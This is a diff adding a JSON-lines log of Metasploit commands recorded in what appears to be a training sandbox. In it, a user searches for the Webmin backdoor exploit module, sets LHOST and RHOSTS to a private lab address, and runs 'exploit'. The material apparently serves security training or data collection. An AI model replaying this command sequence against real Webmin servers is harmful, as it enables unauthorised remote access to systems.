@@ -1,0 +1,17 @@
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:17:20.411992+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:18:13.277411+02:00", "cmd_type": "msf-command", "cmd": "search webmin_back"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:18:18.374135+02:00", "cmd_type": "msf-command", "cmd": "search webmin_backdoor"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:20:07.612240+02:00", "cmd_type": "msf-command", "cmd": "use exploit/linux/http/webmin_backdoor.rb"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:20:29.409849+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:20:53.830422+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:21:10.051407+02:00", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:21:45.546643+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:22:28.278271+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:22:41.512966+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:24:12.881853+02:00", "cmd_type": "msf-command", "cmd": "set LHOST"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:24:49.770418+02:00", "cmd_type": "msf-command", "cmd": "exit"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:25:58.974132+02:00", "cmd_type": "msf-command", "cmd": "use exploit/linux/http/webmin_backdoor.rb"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:26:05.959821+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:26:47.917424+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:26:56.518796+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:27:23.471102+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
